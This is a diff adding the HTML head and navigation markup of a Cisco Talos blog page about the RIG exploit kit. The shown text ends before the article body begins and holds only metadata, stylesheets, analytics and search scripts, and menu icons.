@@ -1,0 +1,1008 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <title>Take the RIG Pill: Down the Rabbit Hole</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/bootstrap.min.css?v=-xdjtZ-fV2QpS1r5">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/navigation.css?v=PhzoiGnw4ldwozL1">
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/footer.css?v=sVEdldiwj6rF6gHP">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/pagination.css?v=HruyeF1JUFuoy6Wu">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/banners.css?v=vI3KT68RWE95HKDs">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/style.css?v=idjnUZoOumC94rdj">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism.css?v=jqyaOB6z6CqMaOT4">
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism-vsc-dark-plus.css?v=xoEFwaYF1JkH_sqf">
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism-talos.css?v=kn8aYcNhO045nXac">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/landing-page.css?v=EPtrK0eJwYLqD25v">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/coverage-block.css?v=vBgCqINSTHrSh9PX">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;1,100;1,300;1,400&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Mono:wght@400;500&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;1,100;1,300;1,400&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/ghost-theme-utils@latest/dist/css/style.min.css" rel="stylesheet">
+
+
+    <meta name="description" content="The adversaries are leveraging Gates (e.g. EITest) to redirect the users to their Landing Page. This leads to a chain of redirects, before the victim finally gets on the landing page of the exploit kit.">
+    <link rel="icon" href="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/size/w256h256/2022/07/talos_o_square.png" type="image/png">
+    <link rel="canonical" href="https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Cisco Talos Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Take the RIG Pill: Down the Rabbit Hole">
+    <meta property="og:description" content="The adversaries are leveraging Gates (e.g. EITest) to redirect the users to their Landing Page. This leads to a chain of redirects, before the victim finally gets on the landing page of the exploit kit.">
+    <meta property="og:url" content="https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/">
+    <meta property="og:image" content="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2023/10/1c.jpg">
+    <meta property="article:published_time" content="2016-11-03T15:00:00.000Z">
+    <meta property="article:modified_time" content="2023-10-25T14:16:59.000Z">
+    <meta property="article:tag" content="Threat Spotlight">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Take the RIG Pill: Down the Rabbit Hole">
+    <meta name="twitter:description" content="The adversaries are leveraging Gates (e.g. EITest) to redirect the users to their Landing Page. This leads to a chain of redirects, before the victim finally gets on the landing page of the exploit kit.">
+    <meta name="twitter:url" content="https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/">
+    <meta name="twitter:image" content="https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2023/10/1c.jpg">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Holger Unterbrink">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="Threat Spotlight">
+    <meta name="twitter:site" content="@TalosSecurity">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Cisco Talos Blog",
+        "url": "https://blog.talosintelligence.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2022/11/TalosBrand_ukraine.svg"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Holger Unterbrink",
+        "url": "https://blog.talosintelligence.com/author/holger-unterbrink/",
+        "sameAs": []
+    },
+    "contributor": [
+        {
+            "@type": "Person",
+            "name": "Christopher Marczewski",
+            "url": "https://blog.talosintelligence.com/author/christopher/",
+            "sameAs": []
+        }
+    ],
+    "headline": "Take the RIG Pill: Down the Rabbit Hole",
+    "url": "https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/",
+    "datePublished": "2016-11-03T15:00:00.000Z",
+    "dateModified": "2023-10-25T14:16:59.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://storage.ghost.io/c/af/a0/afa04ee3-414f-4481-8d23-7e7c146f192e/content/images/2023/10/1c.jpg",
+        "width": 1200,
+        "height": 630
+    },
+    "keywords": "Threat Spotlight",
+    "description": "The adversaries are leveraging Gates (e.g. EITest) to redirect the users to their Landing Page. This leads to a chain of redirects, before the victim finally gets on the landing page of the exploit kit.",
+    "mainEntityOfPage": "https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 6.68">
+    <link rel="alternate" type="application/rss+xml" title="Cisco Talos Blog" href="https://blog.talosintelligence.com/rss/">
+    
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="4ffb0139d74ada998f4b141e4d" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://cisco-talos-blog.ghost.io/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://blog.talosintelligence.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=ShRHxgy4po8zN-Wf"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=WwnU9jw5ancNC8Gc">
+    <script defer src="/public/ghost-stats.min.js?v=vFcCUf6ZQ0Hyhc8h" data-stringify-payload="false" data-datasource="analytics_events" data-storage="localStorage" data-host="https://blog.talosintelligence.com/.ghost/analytics/api/v1/page_hit"  tb_site_uuid="afa04ee3-414f-4481-8d23-7e7c146f192e" tb_post_uuid="4fe024a3-98ac-4515-8b77-e9af740ecbd0" tb_post_type="post" tb_member_uuid="undefined" tb_member_status="undefined" tb_gift_link=""></script><style>:root {--ghost-accent-color: #006db6;}</style>
+    <style type='text/css'>
+    img[src*="icon_check_white.svg"] { width: 20px; margin-left: 0px; margin-right: auto; }
+    
+    #ghost-portal-root { display: none; }
+</style>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F45RVJG3BK"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-F45RVJG3BK');
+</script>
+</head>
+
+<body class="post-template tag-threat-spotlight">
+
+    <div id="mobile-page-header" class="desktop-hide mobile-page-header">
+    <a class="mobile-nav-home-link" href="/">
+        <div class="mobile-logo-wrapper">
+        </div>
+        <div class="mobile-home-title">Blog</div>
+    </a>
+    <div id="mobile-search-wrapper">
+        <button class="search-button mobile-search-button" data-ghost-search>
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+        </button>
+    </div>
+</div>
+
+<nav id="nav">
+    <input id="nav-trigger" class="nav-trigger" type="checkbox"/>
+    <label for="nav-trigger">
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="22px" height="16px" viewBox="0 0 22 16">
+            <g id="menu-icon">
+                <path fill="#FFFFFF" d="M20.5,3h-19C0.672,3,0,2.329,0,1.5S0.672,0,1.5,0h19C21.328,0,22,0.671,22,1.5S21.328,3,20.5,3z"></path>
+                <path fill="#FFFFFF" d="M20.5,9.5h-19C0.672,9.5,0,8.828,0,8c0-0.829,0.672-1.5,1.5-1.5h19C21.328,6.5,22,7.171,22,8   C22,8.828,21.328,9.5,20.5,9.5z"></path>
+                <path fill="#FFFFFF" d="M20.5,16h-19C0.672,16,0,15.328,0,14.5S0.672,13,1.5,13h19c0.828,0,1.5,0.672,1.5,1.5S21.328,16,20.5,16z"></path>
+            </g>
+        </svg>
+    </label>
+    <div id="top-nav-bar">
+    </div>
+
+    <div id="navigation">
+        <div class="navigation-logos-wrapper">
+            <div id="talos-logo-wrapper">
+                <a class="navbar-brand" href="https://talosintelligence.com">
+                </a>
+            </div>
+        </div>
+        <div class="navigation-links-wrapper">
+            <ul class="main-nav-list">
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/reputation">
+                            <div class="mobile-nav-icon"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                            <style type="text/css">
+                                .white{fill:#FFFFFF;}
+                            </style>
+                            <g>
+                                <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
+                                                            <circle class="white" cx="10" cy="10" r="3.2"></circle>
+                            </g>
+                            </svg>
+                            </div>
+                            <span class="top-nav-link-text">
+                                Intelligence Center
+                            </span>
+                        </a>
+                    </div>
+                    <input class="sub-nav-trigger" id="intelligence-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="intelligence-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+
+                    </label>
+                    <ul class="sub-nav sub-nav-single-list">
+                        <li class="desktop-hide">
+                            <a class="mobile_nav_link" href="https://talosintelligence.com/reputation"><h1>Intelligence Center</h1>
+                            </a></li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="intelligence-sub-trigger">BACK</label>
+                        </li>
+                        <li><a class="secondary_nav_link" href="https://talosintelligence.com/reputation_center">Intelligence Search</a></li>
+                        <li><a class="secondary_nav_link" href="https://talosintelligence.com/reputation_center/email_rep">Email &amp; Spam Trends</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                        <style type="text/css">
+                            .white{fill:#FFFFFF;}
+                        </style>
+                                                <g>
+                            <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
+                                                    <circle class="white" cx="10" cy="10" r="3.2"></circle>
+                        </g>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/vulnerability_info"><div class="mobile-nav-icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
+                            <g id="vuln-icon" class="nav-icon">
+                                <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
+                            </g>
+                        </svg>
+                        </div>
+                            <span class="top-nav-link-text">
+                            Vulnerability Research
+                            </span>
+                        </a></div>
+                    <input class="sub-nav-trigger" id="vuln-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="vuln-sub-trigger">
+                        <div class="mobile-nav-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                        </div>
+                    </label>
+                    <ul class="sub-nav sub-nav-single-list">
+                        <li class="desktop-hide">
+                            <a href="https://talosintelligence.com/vulnerability_info"><h1>Vulnerability Research</h1>
+                            </a></li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="vuln-sub-trigger">BACK</label>
+                        </li>
+                        <li><a class="vulnerabilty-info-nav-link" href="https://talosintelligence.com/vulnerability_reports">Vulnerability Reports</a></li>
+                        <li><a class="vulnerabilty-info-nav-link" href="https://talosintelligence.com/ms_advisories">Microsoft Advisories</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
+                        <g id="vuln-icon" class="nav-icon">
+                            <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
+                        </g>
+                        </svg>
+                    </div>
+                </li>
+
+
+               <li class="nav-item">
+                   <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/incident_response">
+                           <div class="mobile-nav-icon">
+                               <svg xmlns="http://www.w3.org/2000/svg" width="111.588" height="148.311" viewBox="0 0 111.588 148.311">
+                                    <path d="M1.181,128.446v15.7a4.167,4.167,0,0,0,4.167,4.167h100.9a4.167,4.167,0,0,0,4.167-4.167v-15.7a4.167,4.167,0,0,0-4.167-4.167H5.348a4.167,4.167,0,0,0-4.167,4.166M55.8,63.109a3.277,3.277,0,1,1,0,6.553c-10.344,0-20.755,8.578-20.755,18.57a3.277,3.277,0,1,1-6.554,0C28.489,73.947,41.93,63.109,55.8,63.109Zm0-12.016c-21.787,0-39.325,17.81-39.325,39.937v26.7H95.122V91.03c0-22.128-17.537-39.937-39.324-39.937m52.365-38.3a3.291,3.291,0,0,0-2.254,1.024L88.432,31.294a3.283,3.283,0,0,0,4.642,4.644l17.478-17.479a3.278,3.278,0,0,0-2.389-5.666m-105.138,0a3.276,3.276,0,0,0-1.98,5.666L18.522,35.938a3.283,3.283,0,0,0,4.643-4.644L5.687,13.817A3.255,3.255,0,0,0,3.025,12.793ZM55.389.026a3.276,3.276,0,0,0-2.867,3.345V19.642a3.277,3.277,0,1,0,6.554,0V3.371A3.283,3.283,0,0,0,55.389.026Z" fill="#fff"></path>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text">
+                                Incident Response
+                            </span>
+                       </a>
+                   </div>
+                   <input class="sub-nav-trigger" id="ir-sub-trigger" type="checkbox">
+                   <label class="sub-nav-trigger-label" for="ir-sub-trigger">
+                       <div class="mobile-nav-icon">
+                           <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                                <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                               <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                               </g>
+                           </svg>
+                       </div>
+                   </label>
+                   <ul class="sub-nav sub-nav-single-list">
+                       <li class="desktop-hide">
+                           <a href="/incident_response">
+                               <h1>Incident Response</h1>
+                           </a>
+                        </li>
+                       <li class="desktop-hide">
+                           <label class="subnav-back-button" for="ir-sub-trigger">BACK</label>
+                       </li>
+                       <li>
+                           <a class="secondary_nav_link" href="https://talosintelligence.com/incident_response/services#reactive-services">Reactive Services</a>
+                       </li>
+                       <li>
+                           <a class="secondary_nav_link" href="https://talosintelligence.com/incident_response/services#proactive-services">Proactive Services</a></li>
+                       <li>
+                           <a href="https://talosintelligence.com/incident_response/contact">Emergency Support</a>
+                        </li>
+                   </ul>
+                   <div class="desktop-hide subnav-overlay"><svg xmlns="http://www.w3.org/2000/svg" width="111.588" height="148.311" viewBox="0 0 111.588 148.311">
+                     <path d="M1.181,128.446v15.7a4.167,4.167,0,0,0,4.167,4.167h100.9a4.167,4.167,0,0,0,4.167-4.167v-15.7a4.167,4.167,0,0,0-4.167-4.167H5.348a4.167,4.167,0,0,0-4.167,4.166M55.8,63.109a3.277,3.277,0,1,1,0,6.553c-10.344,0-20.755,8.578-20.755,18.57a3.277,3.277,0,1,1-6.554,0C28.489,73.947,41.93,63.109,55.8,63.109Zm0-12.016c-21.787,0-39.325,17.81-39.325,39.937v26.7H95.122V91.03c0-22.128-17.537-39.937-39.324-39.937m52.365-38.3a3.291,3.291,0,0,0-2.254,1.024L88.432,31.294a3.283,3.283,0,0,0,4.642,4.644l17.478-17.479a3.278,3.278,0,0,0-2.389-5.666m-105.138,0a3.276,3.276,0,0,0-1.98,5.666L18.522,35.938a3.283,3.283,0,0,0,4.643-4.644L5.687,13.817A3.255,3.255,0,0,0,3.025,12.793ZM55.389.026a3.276,3.276,0,0,0-2.867,3.345V19.642a3.277,3.277,0,1,0,6.554,0V3.371A3.283,3.283,0,0,0,55.389.026Z" fill="#fff"></path>
+                   </svg>
+                </div>
+               </li>
+
+
+
+
+
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://blog.talosintelligence.com">
+                        <div class="mobile-nav-icon">
+                        <!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="260px" height="296.5px" viewBox="0 0 260 296.5" enable-background="new 0 0 260 296.5" xml:space="preserve">
+                        <path fill="#FFFFFF" d="M243.586,42.404h-14.448c-0.943-4.513-3.143-8.813-6.616-12.33L201.793,9.098  c-4.7-4.757-10.972-7.377-17.66-7.377c-6.578,0-12.777,2.547-17.457,7.173l-33.875,33.511H17.586c-6.6,0-12,5.399-12,12V226.28  c0,6.6,5.4,12,12,12H153.83l84.21,56.278l-27.448-56.278h32.994c6.6,0,12-5.4,12-12V54.404  C255.586,47.804,250.186,42.404,243.586,42.404z M214.662,48.045c-0.01,0.2-0.021,0.399-0.044,0.599  c-0.008,0.069-0.021,0.139-0.031,0.207c-0.046,0.345-0.113,0.688-0.196,1.026c-0.034,0.137-0.063,0.273-0.103,0.408  c-0.039,0.135-0.087,0.267-0.133,0.399c-0.051,0.151-0.102,0.302-0.16,0.45c-0.049,0.126-0.105,0.249-0.16,0.373  c-0.068,0.153-0.139,0.307-0.216,0.457c-0.059,0.116-0.12,0.23-0.184,0.345c-0.088,0.157-0.181,0.312-0.278,0.465  c-0.065,0.104-0.13,0.206-0.2,0.308c-0.115,0.168-0.239,0.33-0.366,0.492c-0.064,0.081-0.124,0.165-0.19,0.244  c-0.199,0.238-0.409,0.472-0.635,0.694L82.458,182.308l-47.932,12.871l13.427-47.74L177.223,19.561  c1.917-1.895,4.414-2.84,6.911-2.84c2.534,0,5.068,0.975,6.99,2.92l20.726,20.974c0.545,0.552,1.002,1.156,1.39,1.79  c0.574,0.938,0.975,1.951,1.206,2.993c0.004,0.021,0.01,0.04,0.014,0.06c0.049,0.226,0.086,0.453,0.119,0.682  c0.008,0.06,0.017,0.118,0.024,0.178c0.026,0.211,0.045,0.424,0.058,0.636c0.004,0.077,0.007,0.153,0.009,0.23  c0.007,0.203,0.011,0.407,0.005,0.61C214.673,47.877,214.666,47.961,214.662,48.045z"></path>
+                        </svg>
+                    </div>
+                        <span class="top-nav-link-text">Blog</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://support.talosintelligence.com">
+                        <div class="mobile-nav-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="26px" height="20px" viewBox="0 0 123.17 159.292">
+                            <path d="M61.59,0,0,17.069v85.32c0,23.472,61.59,56.9,61.59,56.9s61.58-36.288,61.58-56.9V17.069Zm-.433,149.746C38.314,136.662,8.128,114.3,8.128,102.389V23.239l53.029-14.7Z" fill="#fff"></path>
+                        </svg>
+                        </div>
+                        <span class="top-nav-link-text">Support</span>
+                    </a>
+                </li>
+            </ul>
+
+
+<!--                <li class="nav-item desktop-hide">-->
+<!--                    <button class="search-button" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg> <span>Search Blog</span></button>-->
+<!--                </li>-->
+
+            <ul class="secondary-nav-list">
+                <div class="more-desktop-link">
+                    <div class="more-link-wrapper">
+                        <span class="more-nav-link">
+                            <div class="desktop-nav-icon more-menu-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="22px" height="16px" viewBox="0 0 22 16">
+                                <g id="menu-icon">
+                                    <path fill="#FFFFFF" d="M20.5,3h-19C0.672,3,0,2.329,0,1.5S0.672,0,1.5,0h19C21.328,0,22,0.671,22,1.5S21.328,3,20.5,3z"></path>
+                                    <path fill="#FFFFFF" d="M20.5,9.5h-19C0.672,9.5,0,8.828,0,8c0-0.829,0.672-1.5,1.5-1.5h19C21.328,6.5,22,7.171,22,8   C22,8.828,21.328,9.5,20.5,9.5z"></path>
+                                    <path fill="#FFFFFF" d="M20.5,16h-19C0.672,16,0,15.328,0,14.5S0.672,13,1.5,13h19c0.828,0,1.5,0.672,1.5,1.5S21.328,16,20.5,16z"></path>
+                                </g>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text top-nav-more-text">
+                            More
+                            </span>
+                        </span>
+                    </div>
+                </div>
+                <li class="nav-item more-text-link">
+                    <div class="more-link-wrapper more-link-wrapper-mobile">
+                        <span class="more-nav-link">
+                            <div class="mobile-nav-icon"><!-- Generator: Adobe Illustrator 24.2.1, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" style="enable-background:new 0 0 20 20;" width="25px" height="25px" xml:space="preserve">
+                                <style type="text/css">
+                                    .white{fill:#FFFFFF;}
+                                </style>
+                                <path class="white" d="M19.4,17.1c0,0.1-0.1,0-0.2,0c0,0-1.3-0.9-2-1.4c-0.2-0.1-0.5-0.1-0.6,0.1c-0.3,0.3-0.6,0.8-0.9,1.3  c-0.1,0.2-0.1,0.5,0.1,0.6l2,1.5c0.1,0,0,0.1,0.1,0.2c0,0.1,0,0.1-0.1,0.2c-1.2,0.5-2.6,0.2-3.5-0.7c-0.8-0.9-1-2-0.7-3.1L4.5,6.5  c-1,0.3-2.3,0-3-0.9c-0.8-0.9-1.1-1.7-1-2.7c0-0.1,0-0.1,0.1-0.2c0.1,0,0.2,0.1,0.2,0.1l2,1.5C3,4.4,3.3,4.5,3.4,4.2  c0,0,0.5-0.8,0.9-1.3c0.1-0.2,0.1-0.5-0.1-0.6L2.3,0.9c-0.1,0,0-0.1-0.1-0.3c0-0.1,0-0.1,0.1-0.2C3.5-0.1,5,0.2,5.8,1.1  c0.8,0.9,1,2,0.7,3.1l9.1,9.3c1-0.3,2.3,0,3,0.9c0.7,0.7,0.9,1.5,0.9,2.5C19.5,16.9,19.5,17,19.4,17.1z"></path>
+                                </svg>
+                            </div>
+                            <span class="top-nav-link-text top-nav-more-text">
+                            Security Resources
+                            </span>
+                        </span>
+                    </div>
+                    <input class="sub-nav-trigger" id="security-resources-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="security-resources-sub-trigger">
+                        <div class="mobile-nav-icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                        </div>
+                    </label>
+                    <div class="sub-nav sub-nav-multiple-list sub-nav-multiple-list-left">
+                        <div class="sub-nav-multiple-wrapper">
+                            <div class="sub-nav-list-top-of-mobile-wrapper">
+                                <h1 class="sub-nav-list-header sub-nav-list-top-of-mobile">Security Resources</h1>
+                                <ul class="sub-nav-list">
+                                    <li class="desktop-hide">
+                                        <label class="subnav-back-button" for="security-resources-sub-trigger">BACK</label>
+                                    </li>
+                                </ul>
